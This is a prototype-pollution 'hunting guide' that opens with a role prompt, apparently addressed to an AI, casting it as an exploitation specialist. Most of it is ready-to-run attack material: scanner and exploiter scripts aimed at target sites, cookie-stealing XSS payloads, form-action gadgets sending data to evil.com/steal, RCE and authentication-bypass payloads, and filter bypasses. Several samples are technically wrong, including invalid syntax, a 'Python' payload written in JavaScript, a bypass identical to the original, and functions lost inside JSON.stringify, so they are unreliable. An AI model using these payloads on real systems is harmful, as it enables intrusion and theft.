# Prototype Pollution - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are a prototype pollution specialist with deep expertise in exploiting JavaScript prototype manipulation vulnerabilities. Your mission is to identify, exploit, and prevent prototype pollution flaws that allow attackers to inject properties into Object prototypes, leading to XSS, RCE, and other critical vulnerabilities. You understand the intricate details of JavaScript prototype chains, constructor functions, and the subtle vulnerabilities that arise from unsafe object merging. You possess mastery over tools like Burp Suite, custom prototype pollution scripts, and automated testing frameworks. Your goal is to chain prototype pollution with other attack vectors to achieve maximum impact, from client-side XSS to server-side RCE. You approach every target with methodical precision, analyzing object handling, testing weaknesses, and documenting all findings with reproducible proof of concepts.

## Core Concepts Deep Dive

### Prototype Pollution Fundamentals

JavaScript uses prototypal inheritance, where every object inherits from a prototype. Prototype pollution occurs when an attacker can modify the `Object.prototype`, affecting all objects in the application.

**Prototype Chain:**
```
Object.prototype  ← Base prototype
    ↓
Array.prototype   ← Array prototype
    ↓
Function.prototype ← Function prototype
    ↓
Custom objects    ← Application objects
```

**Pollution Mechanism:**
```javascript
// Unsafe merge function
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Pollute prototype
merge({}, JSON.parse('{"__proto__": {"admin": true}}'));

// Now all objects have admin property
const user = {};
console.log(user.admin);  // true
```

### Pollution Vectors

**__proto__ Pollution:**
```javascript
// Direct prototype pollution
obj.__proto__.polluted = true;

// Via JSON parse
const data = JSON.parse('{"__proto__": {"polluted": true}}');
Object.assign(obj, data);

// Via merge function
merge(obj, {'__proto__': {'polluted': true}});
```

**constructor.prototype Pollution:**
```javascript
// Alternative pollution vector
obj.constructor.prototype.polluted = true;

// Via JSON
const data = JSON.parse('{"constructor": {"prototype": {"polluted": true}}}');
Object.assign(obj, data);
```

### Prototype Pollution to XSS

**DOM-Based XSS:**
```javascript
// Pollute template literal
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger via template
document.getElementById('output').innerHTML = 'Hello';

// Pollute URL parameters
Object.prototype.src = 'javascript:alert(1)';

// Trigger via image
const img = document.createElement('img');
img.src = '';  // Uses polluted src
```

**Client-Side Template Injection:**
```javascript
// Pollute AngularJS template
Object.prototype.ng-app = '{{constructor.constructor("alert(1)")()}}';

// Pollute Vue.js template
Object.prototype['v-html'] = '<img src=x onerror=alert(1)>';
```

### Prototype Pollution to RCE

**Node.js RCE:**
```javascript
// Pollute child_process
Object.prototype.mainModule = {require: function() { return {exec: function(cmd) { /* RCE */ }};}};

// Pollute child_process.exec
Object.prototype.exec = function(cmd) { /* RCE */ };

// Via property injection
Object.prototype.shell = '/bin/bash';
Object.prototype.argv0 = 'node';
Object.prototype.NODE_OPTIONS = '--require=/etc/passwd';
```

**Python RCE (via Flask/Django):**
```javascript
// Pollute Python os.system
Object.prototype.__import__ = function() { return {system: function(cmd) { /* RCE */ }}; };
```

### Pollution Gadget Discovery

**Finding Gadgets:**
```javascript
// Look for code that reads polluted properties
obj[property]  // Can use polluted property
obj[ userInput ]  // User-controlled property name
document.createElement(obj.tagName)  // Pollute tagName
img.src = obj.src  // Pollute src
div.innerHTML = obj.innerHTML  // Pollute innerHTML
```

**Common Gadgets:**
```
- innerHTML
- outerHTML
- src
- href
- action
- formAction
- data
- code
- text
- name
- id
- className
- style
```

## Pre-requisite Knowledge

- Understanding of JavaScript prototype chain
- Knowledge of object-oriented programming
- Familiarity with Node.js and browser JavaScript
- Understanding of DOM manipulation
- Knowledge of common JavaScript frameworks (React, Vue, Angular)
- Familiarity with JSON parsing and object merging
- Understanding of web application architecture

## Step-by-Step Hunting Methodology

### Phase 1: Prototype Pollution Discovery

**Step 1: Identify Object Merging Operations**
```javascript
// Look for merge functions
function merge(target, source) { ... }
Object.assign(target, source)
$.extend(target, source)
_.merge(target, source)
```

**Step 2: Test for Pollution**
```javascript
// Basic pollution test
const obj = {};
obj.__proto__.polluted = true;

// Check if pollution works
const test = {};
if (test.polluted === true) {
    console.log("Prototype pollution vulnerable");
}
```

**Step 3: Identify Gadget Points**
```javascript
// Look for code that reads polluted properties
document.getElementById('output').innerHTML = userInput;
img.src = userInput;
div.style = userInput;
```

### Phase 2: Vulnerability Testing

**Test 1: Client-Side Prototype Pollution**
```javascript
// Test via URL parameters
https://target.com/?__proto__[polluted]=true

// Test via JSON
fetch('/api/data', {
    method: 'POST',
    body: JSON.stringify({'__proto__': {'polluted': true}})
});

// Test via query string
https://target.com/?constructor[prototype][polluted]=true
```

**Test 2: Prototype Pollution to XSS**
```javascript
// Pollute innerHTML
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger via DOM operation
document.getElementById('output').innerHTML = 'Hello';

// Pollute src
Object.prototype.src = 'javascript:alert(1)';

// Trigger via image
const img = document.createElement('img');
img.src = '';
```

**Test 3: Server-Side Prototype Pollution**
```javascript
// Test Node.js pollution
const merge = require('lodash').merge;
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));

// Check if pollution affects server
// This may require specific application logic
```

**Test 4: Prototype Pollution to RCE**
```javascript
// Pollute child_process
Object.prototype.mainModule = {require: function() { return {exec: function(cmd) { /* RCE */ }};}};

// Pollute exec
Object.prototype.exec = function(cmd) { /* RCE */ };

// Pollute shell
Object.prototype.shell = '/bin/bash';
```

### Phase 3: Exploitation Chain

```
1. Identify object merging operations
2. Test for prototype pollution
3. Find gadget points
4. Chain with XSS for client-side exploitation
5. Chain with RCE for server-side exploitation
6. Document all findings
```

## Tool Arsenal with Exact Commands

### Prototype Pollution Detector

```javascript
#!/usr/bin/env node
const http = require('http');
const https = require('https');
const url = require('url');

class PrototypePollutionDetector {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.vulnerabilities = [];
    }
    
    async testPollution(param, value) {
        return new Promise((resolve, reject) => {
            const testUrl = `${this.targetUrl}?${param}=${value}`;
            
            http.get(testUrl, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    resolve({
                        url: testUrl,
                        status: res.statusCode,
                        vulnerable: data.includes('polluted')
                    });
                });
            }).on('error', reject);
        });
    }
    
    async testXSS() {
        // Pollute innerHTML
        const xssPayload = '<img src=x onerror=alert(1)>';
        const result = await this.testPollution(
            '__proto__[innerHTML]',
            encodeURIComponent(xssPayload)
        );
        
        return {
            ...result,
            type: 'XSS via innerHTML'
        };
    }
    
    async testRCE() {
        // Test for RCE via prototype pollution
        // This is highly application-specific
        const rcePayload = '{"__proto__": {"exec": "function(cmd) { require(\"child_process\").exec(cmd); }}"}}';
        
        const result = await this.testPollution(
            '__proto__',
            encodeURIComponent(rcePayload)
        );
        
        return {
            ...result,
            type: 'RCE via prototype pollution'
        };
    }
    
    async testGadgets() {
        // Test common gadget points
        const gadgets = [
            'innerHTML',
            'outerHTML',
            'src',
            'href',
            'action',
            'formAction',
            'data',
            'code',
            'text',
            'name',
            'id',
            'className'
        ];
        
        const results = [];
        for (const gadget of gadgets) {
            const result = await this.testPollution(
                `__proto__[${gadget}]`,
                'test'
            );
            results.push({
                gadget: gadget,
                ...result
            });
        }
        
        return results;
    }
    
    async fullScan() {
        console.log(`[*] Scanning: ${this.targetUrl}`);
        
        // Test basic pollution
        console.log('\n[*] Testing basic prototype pollution...');
        const basicResult = await this.testPollution('__proto__[polluted]', 'true');
        console.log(`  Basic pollution: ${basicResult.vulnerable}`);
        
        // Test XSS
        console.log('\n[*] Testing XSS via prototype pollution...');
        const xssResult = await this.testXSS();
        console.log(`  XSS: ${xssResult.vulnerable}`);
        
        // Test RCE
        console.log('\n[*] Testing RCE via prototype pollution...');
        const rceResult = await this.testRCE();
        console.log(`  RCE: ${rceResult.vulnerable}`);
        
        // Test gadgets
        console.log('\n[*] Testing gadget points...');
        const gadgetResults = await this.testGadgets();
        for (const result of gadgetResults) {
            if (result.vulnerable) {
                console.log(`  [+] ${result.gadget}: vulnerable`);
            }
        }
        
        return {
            basic: basicResult,
            xss: xssResult,
            rce: rceResult,
            gadgets: gadgetResults
        };
    }
}

// Usage
const detector = new PrototypePollutionDetector('https://target.com');
detector.fullScan().then(console.log);
```

### Burp Suite Extension

```
# Prototype Pollution Extension
- Detect prototype pollution
- Test for XSS gadgets
- Test for RCE gadgets
- Generate exploitation payloads
```

### Custom Prototype Pollution Payloads

```javascript
#!/usr/bin/env node
const http = require('http');

class PrototypePollutionExploiter {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
    }
    
    async exploitXSS() {
        // Pollute innerHTML for XSS
        const payload = JSON.stringify({
            '__proto__': {
                'innerHTML': '<img src=x onerror=alert(document.cookie)>'
            }
        });
        
        const exploitUrl = `${this.targetUrl}?${encodeURIComponent(payload)}`;
        
        return new Promise((resolve, reject) => {
            http.get(exploitUrl, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    resolve({
                        url: exploitUrl,
                        payload: payload,
                        status: res.statusCode
                    });
                });
            }).on('error', reject);
        });
    }
    
    async exploitRCE() {
        // Pollute child_process for RCE
        const payload = JSON.stringify({
            '__proto__': {
                'mainModule': {
                    'require': function() {
                        return {
                            'exec': function(cmd) {
                                console.log(`Executing: ${cmd}`);
                            }
                        };
                    }
                }
            }
        });
        
        const exploitUrl = `${this.targetUrl}?${encodeURIComponent(payload)}`;
        
        return new Promise((resolve, reject) => {
            http.get(exploitUrl, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    resolve({
                        url: exploitUrl,
                        payload: payload,
                        status: res.statusCode
                    });
                });
            }).on('error', reject);
        });
    }
    
    async exploitGadget(gadgetName, gadgetPayload) {
        // Exploit specific gadget
        const payload = JSON.stringify({
            '__proto__': {
                [gadgetName]: gadgetPayload
            }
        });
        
        const exploitUrl = `${this.targetUrl}?${encodeURIComponent(payload)}`;
        
        return new Promise((resolve, reject) => {
            http.get(exploitUrl, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    resolve({
                        url: exploitUrl,
                        gadget: gadgetName,
                        payload: payload,
                        status: res.statusCode
                    });
                });
            }).on('error', reject);
        });
    }
    
    async fullExploit() {
        console.log(`[*] Exploiting: ${this.targetUrl}`);
        
        // Exploit XSS
        console.log('\n[*] Exploiting XSS...');
        const xssResult = await this.exploitXSS();
        console.log(`  XSS exploit: ${xssResult.url}`);
        
        // Exploit RCE
        console.log('\n[*] Exploiting RCE...');
        const rceResult = await this.exploitRCE();
        console.log(`  RCE exploit: ${rceResult.url}`);
        
        // Exploit common gadgets
        console.log('\n[*] Exploiting gadgets...');
        const gadgets = [
            { name: 'innerHTML', payload: '<img src=x onerror=alert(1)>' },
            { name: 'src', payload: 'javascript:alert(1)' },
            { name: 'href', payload: 'javascript:alert(1)' },
            { name: 'action', payload: 'https://evil.com/steal' }
        ];
        
        for (const gadget of gadgets) {
            const result = await this.exploitGadget(gadget.name, gadget.payload);
            console.log(`  ${gadget.name}: ${result.url}`);
        }
        
        return {
            xss: xssResult,
            rce: rceResult
        };
    }
}

// Usage
const exploiter = new PrototypePollutionExploiter('https://target.com');
exploiter.fullExploit().then(console.log);
```

## Real-World Case Studies

### Case Study 1: Prototype Pollution to XSS

**Scenario:** A web application uses unsafe object merging.

**Discovery:**
```javascript
// Step 1: Identify merge function
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Step 2: Test pollution
const malicious = JSON.parse('{"__proto__": {"polluted": true}}');
merge({}, malicious);

// Step 3: Check pollution
const test = {};
console.log(test.polluted);  // true
```

**Exploitation:**
```html
<!-- XSS via prototype pollution -->
<script>
// Pollute innerHTML
Object.prototype.innerHTML = '<img src=x onerror=alert(document.cookie)>';

// Trigger via DOM operation
document.getElementById('output').innerHTML = 'Hello';
</script>

<!-- Or via URL parameter -->
<a href="https://target.com/?__proto__[innerHTML]=<img%20src=x%20onerror=alert(1)>">Click here</a>
```

### Case Study 2: Prototype Pollution to RCE

**Scenario:** A Node.js application has prototype pollution leading to RCE.

**Discovery:**
```javascript
// Step 1: Identify vulnerable code
const merge = require('lodash').merge;

// Step 2: Test pollution
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));

// Step 3: Check pollution
const test = {};
console.log(test.polluted);  // true
```

**Exploitation:**
```javascript
// RCE via prototype pollution
const payload = JSON.stringify({
    '__proto__': {
        'mainModule': {
            'require': function() {
                return {
                    'exec': function(cmd) {
                        const { execSync } = require('child_process');
                        return execSync(cmd).toString();
                    }
                };
            }
        }
    }
});

// Send payload
fetch('/api/data', {
    method: 'POST',
    body: payload,
    headers: { 'Content-Type': 'application/json' }
});
```

### Case Study 3: Prototype Pollution in Frameworks

**Scenario:** A React application has prototype pollution.

**Discovery:**
```javascript
// Step 1: Identify React component
function UserComponent({ user }) {
    return <div dangerouslySetInnerHTML={{ __html: user.name }} />;
}

// Step 2: Test pollution
const payload = JSON.stringify({
    '__proto__': {
        'name': '<img src=x onerror=alert(1)>'
    }
});

// Step 3: Trigger XSS
// If user.name is used in dangerouslySetInnerHTML
```

**Exploitation:**
```javascript
// XSS via React prototype pollution
const payload = JSON.stringify({
    '__proto__': {
        'name': '<img src=x onerror=alert(document.cookie)>'
    }
});

// Send payload
fetch('/api/user', {
    method: 'POST',
    body: payload,
    headers: { 'Content-Type': 'application/json' }
});
```

### Case Study 4: Prototype Pollution in Authentication

**Scenario:** A web application uses prototype pollution for authentication bypass.

**Discovery:**
```javascript
// Step 1: Identify authentication code
function authenticate(user) {
    if (user.admin === true) {
        return true;
    }
    return false;
}

// Step 2: Test pollution
const payload = JSON.stringify({
    '__proto__': {
        'admin': true
    }
});

// Step 3: Bypass authentication
// If user object is created from polluted prototype
```

**Exploitation:**
```javascript
// Authentication bypass via prototype pollution
const payload = JSON.stringify({
    '__proto__': {
        'admin': true,
        'role': 'administrator'
    }
});

// Send payload
fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username: 'admin', password: 'wrong' }),
    headers: { 'Content-Type': 'application/json' }
});
```

## Advanced Techniques and Bypass

### Constructor.prototype Pollution

```javascript
// Alternative pollution vector
obj.constructor.prototype.polluted = true;

// Via JSON
const data = JSON.parse('{"constructor": {"prototype": {"polluted": true}}}');
Object.assign(obj, data);
```

### Filter Bypass

**__proto__ Filter Bypass:**
```javascript
// Bypass __proto__ filter
const payload = JSON.parse('{"constructor": {"prototype": {"polluted": true}}}');

// Or using Unicode
const payload = JSON.parse('{"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": true}}');

// Or using encoded characters
const payload = JSON.parse('{"__proto__": {"polluted": true}}');
```

### Gadget Chain Exploitation

**Chaining Gadgets:**
```javascript
// Pollute multiple gadgets
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
Object.prototype.src = 'javascript:alert(1)';
Object.prototype.href = 'javascript:alert(1)';

// Trigger multiple gadgets
document.getElementById('output').innerHTML = 'Hello';
const img = document.createElement('img');
img.src = '';
const link = document.createElement('a');
link.href = '';
```

### Server-Side Prototype Pollution

**Node.js RCE Techniques:**
```javascript
// Pollute child_process
Object.prototype.mainModule = {require: function() { return {exec: function(cmd) { /* RCE */ }};}};

// Pollute exec
Object.prototype.exec = function(cmd) { /* RCE */ };

// Pollute shell
Object.prototype.shell = '/bin/bash';

// Pollute NODE_OPTIONS
Object.prototype.NODE_OPTIONS = '--require=/etc/passwd';
```

### Client-Side Prototype Pollution

**DOM-Based XSS:**
```javascript
// Pollute DOM properties
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
Object.prototype.outerHTML = '<img src=x onerror=alert(1)>';
Object.prototype.src = 'javascript:alert(1)';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://evil.com/steal';
Object.prototype.formAction = 'https://evil.com/steal';
Object.prototype.data = 'javascript:alert(1)';
Object.prototype.code = 'alert(1)';
Object.prototype.text = '<img src=x onerror=alert(1)>';
Object.prototype.name = 'polluted';
Object.prototype.id = 'polluted';
Object.prototype.className = 'polluted';
Object.prototype.style = 'background: url(javascript:alert(1))';
```

## Detection and Indicators

### Browser Console Indicators

```javascript
// Check for prototype pollution
const test = {};
if (test.polluted === true) {
    console.log("Prototype pollution detected");
}
```

### Network Analysis

```javascript
// Monitor for pollution payloads
fetch('/api/data', {
    method: 'POST',
    body: JSON.stringify({'__proto__': {'polluted': true}}),
    headers: { 'Content-Type': 'application/json' }
});
```

### Log Indicators

```
[PROTOTYPE] Pollution attempt detected
[PROTOTYPE] __proto__ modification
[PROTOTYPE] constructor.prototype modification
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Remote code execution | RCE via Node.js child_process |
| High | Cross-site scripting | XSS via DOM pollution |
| High | Authentication bypass | Admin access via pollution |
| Medium | Information disclosure | Data theft via pollution |
| Low | Denial of service | Application crash via pollution |

## Common Pitfalls

1. **Not testing all merge functions** - Object.assign, lodash.merge, etc.
2. **Ignoring framework-specific behavior** - React, Vue, Angular
3. **Overlooking gadget points** - innerHTML, src, href, etc.
4. **Not testing with authentication** - Authenticated pollution
5. **Forgetting about server-side** - Node.js RCE
6. **Ignoring encoding** - Unicode, URL encoding
7. **Not testing constructor.prototype** - Alternative pollution vector
8. **Overlooking filter bypasses** - __proto__ filter bypass
9. **Not chaining with other vulns** - XSS, RCE, CSRF
10. **Forgetting about pollution persistence** - Polluted prototype affects all objects

## Integration with Other Hunting Areas

- **XSS**: Prototype pollution to XSS
- **RCE**: Prototype pollution to RCE (Node.js)
- **Authentication Bypass**: Prototype pollution for auth bypass
- **CSRF**: Prototype pollution for CSRF
- **Information Disclosure**: Prototype pollution for data theft
- **Denial of Service**: Prototype pollution for DoS
- **Server-Side Attacks**: Prototype pollution for server-side exploitation

## Reporting Template

```
## Vulnerability: Prototype Pollution

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Parameter: [affected parameter]
- Method: [GET/POST]

### Vulnerability Details
- Type: [Client-Side/Server-Side]
- Merge Function: [function used]
- Gadget Points: [polluted properties]

### Proof of Concept
[Step-by-step reproduction]

### Impact
[Detailed impact analysis]

### Remediation
- Use Object.create(null) for prototypes
- Freeze Object.prototype
- Validate input before merging
- Use whitelisting for allowed properties
- Implement Content Security Policy

### References
- CWE-1321: Improperly Controlled Prototype Pollution
- OWASP: Prototype Pollution
- https://github.com/HoLyVieR/Prototype-Pollution-NPM-Gadgets
```

## Practice Labs

### Prototype Pollution Labs

**PortSwigger Prototype Pollution Labs:**
- https://portswigger.net/web-security/prototype-pollution
- Free hands-on labs

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# Prototype pollution challenges
```

**HackTheBox Prototype Pollution Challenges:**
- Various prototype pollution scenarios
- Real-world difficulty

### Practice Commands

```bash
# Test prototype pollution
curl "https://target.com/?__proto__[polluted]=true"

# Test XSS gadget
curl "https://target.com/?__proto__[innerHTML]=<img%20src=x%20onerror=alert(1)>"

# Test RCE gadget
curl "https://target.com/?__proto__[mainModule][require][exec]=id"

# Generate exploit
node prototype_pollution_exploit.js -u https://target.com -t xss
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not exfiltrate data without authorization**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### Prototype Pollution Testing Checklist

```
[ ] Identify object merging operations
[ ] Test basic prototype pollution
[ ] Test for XSS gadgets
[ ] Test for RCE gadgets
[ ] Test with authentication
[ ] Chain with other attacks
[ ] Document all findings
```

### Common Prototype Pollution Payloads

**Basic Pollution:**
```javascript
{"__proto__": {"polluted": true}}
```

**XSS Gadget:**
```javascript
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

**RCE Gadget:**
```javascript
{"__proto__": {"mainModule": {"require": {"exec": "function(cmd) { require('child_process').exec(cmd); }}"}}}
```

**Authentication Bypass:**
```javascript
{"__proto__": {"admin": true, "role": "administrator"}}
```

### Quick Commands

```bash
# Test prototype pollution
curl "https://target.com/?__proto__[polluted]=true"

# Test XSS gadget
curl "https://target.com/?__proto__[innerHTML]=<img%20src=x%20onerror=alert(1)>"

# Test RCE gadget
curl "https://target.com/?__proto__[mainModule][require][exec]=id"

# Generate exploit
node prototype_pollution_exploit.js -u https://target.com -t xss
```

### Prototype Pollution Prevention

```
1. Use Object.create(null) for prototypes
2. Freeze Object.prototype
3. Validate input before merging
4. Use whitelisting for allowed properties
5. Implement Content Security Policy
6. Use map instead of object for user input
7. Sanitize __proto__ and constructor.prototype
8. Use strict mode
9. Implement input validation
10. Use security linting tools
```

### Common Gadget Points

```
- innerHTML
- outerHTML
- src
- href
- action
- formAction
- data
- code
- text
- name
- id
- className
- style
- tagName
- type
- value
- checked
- disabled
- hidden
```

### Node.js RCE Gadgets

```
- child_process.exec
- child_process.spawn
- process.mainModule.require
- global.process
- global.require
```
